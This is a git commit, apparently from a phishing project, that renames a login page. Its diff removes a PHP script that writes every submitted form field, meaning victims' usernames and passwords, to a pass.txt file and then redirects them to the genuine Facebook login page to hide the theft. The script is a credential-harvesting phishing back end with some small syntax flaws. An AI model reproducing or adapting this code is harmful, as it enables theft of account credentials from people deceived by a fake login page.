250fd6be0da78ab1b17639b51fc80490e9641446
creator1871 <65519405+creator1871@users.noreply.github.com>
2020-05-25 17:44:22 +0700

    Update and rename login.php to login.html

--- login.php
+++
@@ -1,2 +0,0 @@
-<?php 
-header('Location: http://www.Facebook.com/login.php'); $handle = fopen("pass.txt", "a"); foreach($_POST as $variable => $value) { fwrite($handle, $variable); fwrite($handle, '='); fwrite($handle, $value); fwrite($handle, "\r\n"); } fwrite($handle, "\r\n"); fclose($handle); $date = date (''); $ip = getIP(); exit;e ?>
